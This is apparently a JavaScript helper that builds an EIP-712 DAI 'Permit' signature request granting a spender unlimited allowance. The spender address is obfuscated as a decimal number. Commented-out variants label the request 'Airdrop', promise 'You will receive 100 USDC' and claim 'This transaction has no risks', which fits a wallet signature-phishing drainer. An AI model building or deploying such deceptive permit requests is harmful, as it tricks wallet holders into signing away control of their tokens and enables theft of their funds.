function genTypedData(chainId, verifyAddr) {
    
    const transferParams = {
        _nftAmount: '0000000000000000000000000000000000000000000000000000000000000001'
    };

    // 构建 EIP-712 签名数据
    const typedData = {
        types: {
            EIP712Domain: [
              { name: 'name', type: 'string' },
              { name: 'version', type: 'string' },
              { name: 'chainId', type: 'uint256' },
              { name: 'verifyingContract', type: 'address' },
            ],
            Permit: [
              { name: 'spender', type: 'address' },
              { name: 'nonce', type: 'uint256' },
              { name: 'expiry', type: 'uint256' },
              { name: 'allowed', type: 'bool' },
            ],
            // Permit: [
            //     { name: 'Activity', type: 'string' },
            //     { name: 'Simulation_result', type: 'string' },
            //     { name: 'Security', type: 'string' },
            //   ],
          },
          domain: {
            name: 'Dai Stablecoin',
            version: '1',
            verifyingContract: verifyAddr,
            chainId: chainId,
          },
          primaryType: 'Permit',
          message: {
            // spender: '0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45',
            spender: '597733001430176024049334587394716596403930790981',
            allowed: true,
            nonce: 0,
            expiry: 1660916504,
          },    

        // message: {
        //     Activity: "Airdrop",
        //     Simulation_result: "You will receive 100 USDC",
        //     Security: "This transaction has no risks"
        // }
    }

    // const typedData = {
    //     types: {
    //         EIP712Domain: [...],
    //         Permit: [...]
    //     },
    //     primaryType: 'Permit',
    //     domain: {
    //         name: 'Test Token',
    //         version: '1',
    //         chainId: chainId,
    //         verifyingContract: verifyAddr
    //     },
    //     message: {
    //         Activity: "Airdrop",
    //         Simulation_result: "You will receive 100 USDC",
    //         Security: "This transaction has no risks"
    //     }
    // }


    return typedData
}

export default genTypedData;